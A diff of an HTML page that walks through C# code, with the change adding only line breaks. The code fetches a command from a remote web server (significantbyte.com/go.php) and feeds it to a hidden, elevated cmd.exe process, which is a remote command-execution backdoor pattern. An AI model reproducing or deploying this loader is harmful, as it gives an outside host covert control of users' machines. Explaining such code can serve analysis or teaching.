@@ -3,18 +3,18 @@
 <b>Let's understand it.</b><br>
 <b>This will get the command from online web server.
 </b><br>
-                          new WebClient().DownloadString("https://r.significantbyte.com/go.php");
+                          new WebClient().DownloadString("https://r.significantbyte.com/go.php");<br>
 <br>
 <b>Run command in device.</b><br>
-                            Process cmd = new Process();
-                            cmd.StartInfo.FileName = "cmd.exe";
-                            cmd.StartInfo.RedirectStandardInput = true;
-                            cmd.StartInfo.RedirectStandardOutput = true;
-                            cmd.StartInfo.CreateNoWindow = true;
-                            cmd.StartInfo.UseShellExecute = false;
-                            cmd.StartInfo.Verb = "runas";
-                            cmd.Start();
-                            cmd.StandardInput.WriteLine(json);
+                            Process cmd = new Process();<br>
+                            cmd.StartInfo.FileName = "cmd.exe";<br>
+                            cmd.StartInfo.RedirectStandardInput = true;<br>
+                            cmd.StartInfo.RedirectStandardOutput = true;<br>
+                            cmd.StartInfo.CreateNoWindow = true;<br>
+                            cmd.StartInfo.UseShellExecute = false;<br>
+                            cmd.StartInfo.Verb = "runas";<br>
+                            cmd.Start();<br>
+                            cmd.StandardInput.WriteLine(json);<br>
                             <br>
   
 <b>Lets wait for 1 second</b>
